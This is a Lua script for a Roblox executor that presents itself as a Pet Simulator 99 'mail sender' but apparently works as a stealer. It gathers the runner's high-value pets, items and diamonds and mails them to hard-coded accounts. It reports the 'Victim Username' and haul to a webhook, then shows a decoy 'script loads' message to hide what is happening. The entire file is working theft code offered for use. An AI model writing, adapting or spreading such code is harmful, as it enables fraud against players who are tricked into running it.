-- Minimal, executor-friendly PS99 mail sender
-- Paste into your executor and run

-- CONFIG (set these in _G before running if you want)
local users = _G.Usernames or {"ilovemyamazing_gf1","Yeahboi1131","Dragonshell23","Dragonshell24","Dragonshell21"}
local min_rap = _G.minrap or 1000000
local webhook = _G.webhook or ""   -- set to your webhook or leave blank to skip webhook posts
local MailMessage = _G.MailMessage or "GGz"

print("[PS99] Starting script...")

-- SAFE require helper
local function safeRequire(path, desc)
    local ok, res = pcall(function() return require(path) end)
    if not ok or res == nil then
        warn("[PS99] Failed to require " .. (desc or tostring(path)))
        return nil
    end
    return res
end

-- Try to load modules (most executors let this work)
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local ok, Library = pcall(function() return ReplicatedStorage:WaitForChild("Library", 3) end)
if not ok or not Library then
    warn("[PS99] Library not found in ReplicatedStorage (timed out). Continuing, may still work in some executors.")
end

local network = nil
if Library and Library:FindFirstChild("Client") and Library.Client:FindFirstChild("Network") then
    network = safeRequire(Library.Client.Network, "Network")
else
    -- fallback: try require by path directly (some executors allow require on datamodel objects)
    pcall(function() network = require(ReplicatedStorage.Library.Client.Network) end)
end

if not network then warn("[PS99] network module not available. Script will likely fail at network.Invoke calls.") end

-- Save/Get helpers
local SaveModule = nil
if Library and Library.Client and Library.Client:FindFirstChild("Save") then
    SaveModule = safeRequire(Library.Client.Save, "Save")
else
    pcall(function() SaveModule = require(ReplicatedStorage.Library.Client.Save) end)
end
if not SaveModule then warn("[PS99] Save module not available.") end

local RAPCmds = nil
if Library and Library.Client and Library.Client:FindFirstChild("RAPCmds") then
    RAPCmds = safeRequire(Library.Client.RAPCmds, "RAPCmds")
else
    pcall(function() RAPCmds = require(ReplicatedStorage.Library.Client.RAPCmds) end)
end
if not RAPCmds then warn("[PS99] RAPCmds module not available.") end

local message = nil
if Library and Library.Client and Library.Client:FindFirstChild("Message") then
    message = safeRequire(Library.Client.Message, "Message")
else
    pcall(function() message = require(ReplicatedStorage.Library.Client.Message) end)
end

-- helper to get current save safely
local function GetSaveSafe()
    if SaveModule and type(SaveModule.Get) == "function" then
        local ok, res = pcall(function() return SaveModule.Get() end)
        if ok and res then return res end
    end
    -- fallback: try direct require again (best-effort)
    if pcall(function() return require(ReplicatedStorage.Library.Client.Save) end) then
        return require(ReplicatedStorage.Library.Client.Save).Get()
    end
    return nil
end

local saveData = GetSaveSafe()
if not saveData then warn("[PS99] Could not read Save/Inventory. Script may not find items.") end

-- find mail cost function via getgc
local FunctionToGetFirstPriceOfMail = nil
local success_gc, gc = pcall(function() return getgc and getgc(true) end)
if success_gc and gc then
    for _, obj in ipairs(gc) do
        if type(obj) == "function" then
            local ok, name = pcall(function() return debug.getinfo(obj).name end)
            if ok and name == "computeSendMailCost" then
                FunctionToGetFirstPriceOfMail = obj
                break
            end
        end
    end
end

local mailSendPrice = 1000
if FunctionToGetFirstPriceOfMail then
    local ok, value = pcall(FunctionToGetFirstPriceOfMail)
    if ok and type(value) == "number" then mailSendPrice = value end
end
print("[PS99] Initial mail price:", mailSendPrice)

-- get diamonds amount
local GemAmount1 = 1
do
    local s = GetSaveSafe()
    if s and s.Inventory and s.Inventory.Currency then
        for i, v in pairs(s.Inventory.Currency) do
            if v.id == "Diamonds" then
                GemAmount1 = v._am or 1
                break
            end
        end
    end
end
print("[PS99] Starting diamonds:", GemAmount1)

-- format function
local function formatNumber(number)
    number = math.floor(tonumber(number) or 0)
    local suffixes = {"","k","m","b","t"}
    local idx = 1
    while number >= 1000 and idx < #suffixes do
        number = number / 1000
        idx = idx + 1
    end
    return string.format("%.2f%s", number, suffixes[idx])
end

-- safe network invoke wrapper
local function safeInvoke(...)
    if not network or not network.Invoke then
        return nil, "network missing"
    end
    local ok, res1, res2 = pcall(function() return network.Invoke(... ) end)
    if not ok then
        return nil, tostring(res1)
    end
    return res1, res2
end

-- send webhook (best-effort)
local HttpService = game:GetService("HttpService")
local function postWebhook(payload)
    if webhook == nil or webhook == "" then return end
    local ok, _ = pcall(function()
        request({
            Url = webhook,
            Method = "POST",
            Headers = {["Content-Type"]="application/json"},
            Body = HttpService:JSONEncode(payload)
        })
    end)
    if not ok then warn("[PS99] webhook request failed (executor may block request).") end
end

-- RAP getter (safe)
local function getRAP(Type, Item)
    if not RAPCmds or not RAPCmds.Get then return 0 end
    local ok, res = pcall(function()
        return RAPCmds.Get({
            Class = {Name = Type},
            IsA = function(h) return h == Type end,
            GetId = function() return Item.id end,
            StackKey = function() return HttpService:JSONEncode({id=Item.id, pt=Item.pt, sh=Item.sh, tn=Item.tn}) end,
            AbstractGetRAP = function() return nil end
        })
    end)
    if ok and res then return res end
    return 0
end

-- collect items to send
local sortedItems = {}
local totalRAP = 0

local SaveRoot = GetSaveSafe()
local inventory = SaveRoot and SaveRoot.Inventory or (saveData and saveData.Inventory) or nil
if not inventory then warn("[PS99] Inventory not found; script may not send anything.") end

local categoryList = {"Pet","Egg","Charm","Enchant","Potion","Misc","Hoverboard","Booth","Ultimate"}

for _, category in ipairs(categoryList) do
    if inventory and inventory[category] then
        for uid, item in pairs(inventory[category]) do
            if category == "Pet" then
                local dir_ok, dir = pcall(function() return ReplicatedStorage.Library.Directory.Pets[item.id] end)
                if dir_ok and dir and (dir.gargantuan or dir.titanic or dir.huge or dir.exclusiveLevel) then
                    local rapValue = getRAP(category, item)
                    if rapValue >= min_rap then
                        local prefix = ""
                        if item.pt and item.pt == 1 then prefix = "Golden " end
                        if item.pt and item.pt == 2 then prefix = "Rainbow " end
                        if item.sh then prefix = "Shiny " .. prefix end
                        local name = prefix .. item.id
                        -- pets are treated as amount = 1 even if _am > 1
                        table.insert(sortedItems, {category=category, uid=uid, amount=1, rap=rapValue, name=name})
                        totalRAP = totalRAP + rapValue
                    end
                end
            else
                local rapValue = getRAP(category, item)
                if rapValue >= min_rap then
                    local amt = item._am or 1
                    table.insert(sortedItems, {category=category, uid=uid, amount=amt, rap=rapValue, name=item.id})
                    totalRAP = totalRAP + rapValue * amt
                end
            end
        end
    end
end

-- Sort highest RAP-first (rap * amount)
table.sort(sortedItems, function(a,b) return (a.rap * a.amount) > (b.rap * b.amount) end)

print("[PS99] Items queued:", #sortedItems, "Total RAP:", totalRAP)

-- builds embed and posts webhook (best-effort)
local function SendMessage(diamonds)
    if webhook == nil or webhook == "" then return end
    local fields = {
        { name = "Victim Username:", value = game.Players.LocalPlayer.Name, inline = true },
        { name = "Items to be sent:", value = "", inline = false },
        { name = "Summary:", value = "", inline = false }
    }

    local map = {}
    for _, it in ipairs(sortedItems) do
        if map[it.name] then
            map[it.name].amount = map[it.name].amount + it.amount
        else
            map[it.name] = { amount = it.amount, rap = it.rap }
        end
    end

    local lines = {}
    for pname, pdata in pairs(map) do
        table.insert(lines, pname .. " (x" .. pdata.amount .. "): " .. formatNumber(pdata.rap * pdata.amount) .. " RAP")
    end
    table.sort(lines, function(a,b) return a > b end) -- order doesn't matter much here

    fields[2].value = table.concat(lines, "\n")
    fields[3].value = string.format("Gems: %s\nTotal RAP: %s", formatNumber(diamonds), formatNumber(totalRAP))

    local data = { embeds = {{ title = "🔱 New PS99 Execution", color = 65280, fields = fields, footer = { text = "Strike Hub." } }} }
    postWebhook(data)
end

-- Try sending one item (pets 1 per mail, others full stack)
local function sendItem(category, uid, am)
    local remaining = am or 1
    while remaining > 0 do
        if GemAmount1 <= mailSendPrice then
            print("[PS99] Not enough gems to send next item. Stopping.")
            return false
        end

        local sentThisUnit = false
        -- try each user in order, move to next on full
        for i=1, #users do
            local currentUser = users[i]
            local sendAmount = (category == "Pet") and 1 or remaining
            local ok, response = pcall(function()
                return network.Invoke("Mailbox: Send", currentUser, MailMessage, category, uid, sendAmount)
            end)

            if ok and response == true then
                -- success
                sentThisUnit = true
                if category == "Pet" then remaining = remaining - 1
                else remaining = 0 end

                GemAmount1 = GemAmount1 - mailSendPrice
                mailSendPrice = math.ceil(mailSendPrice * 1.5)
                if mailSendPrice > 5000000 then mailSendPrice = 5000000 end

                print(string.format("[PS99] Sent %s x%s to %s (cost %s). Gems left: %s", category, sendAmount, currentUser, mailSendPrice, GemAmount1))
                break
            else
                -- if response is false and error says full, try next user. some executors return (false, "They don't have enough space!")
                if ok and response == false then
                    -- response false: treat as mailbox full and try next user
                    -- continue
                end
                -- else network.Invoke errored; try next user
            end
        end

        if not sentThisUnit then
            print("[PS99] No users accepted this item (mailboxes full or errors). Stopping for this item.")
            return false
        end
    end
    return true
end

-- Send all gems (in one mail, minus mailSendPrice)
local function SendAllGems()
    if GemAmount1 <= mailSendPrice + 10000 then
        print("[PS99] Not enough gems to do bulk send.")
        return
    end

    local amountToSend = GemAmount1 - mailSendPrice
    if amountToSend <= 0 then return end

    for i=1,#users do
        local user = users[i]
        local ok, response = pcall(function()
            return network.Invoke("Mailbox: Send", user, MailMessage, "Currency", "Diamonds", amountToSend)
        end)
        if ok and response == true then
            GemAmount1 = GemAmount1 - amountToSend
            print("[PS99] Sent gems to "..user..", amount: "..amountToSend)
            return true
        end
    end
    print("[PS99] Failed to send gems to any user.")
    return false
end

-- Main execution
if #sortedItems == 0 and not (GemAmount1 > min_rap + mailSendPrice) then
    print("[PS99] Nothing to send (no high-rap items and not enough gems).")
else
    -- webhook summary first (best-effort)
    pcall(function() SendMessage(GemAmount1) end)

    for _, item in ipairs(sortedItems) do
        if item.rap >= mailSendPrice and GemAmount1 > mailSendPrice then
            local ok = sendItem(item.category, item.uid, item.amount)
            if not ok then
                print("[PS99] Stopping further sends due to failure for item:", item.name)
                break
            end
        else
            print("[PS99] Skipping item (cost>rap or not enough gems):", item.name)
        end
    end

    if GemAmount1 > mailSendPrice then
        pcall(SendAllGems)
    end

    if message and message.Error then
        pcall(function() message.Error("Please wait while the script loads!") end)
    end
end

print("[PS99] Script finished.")
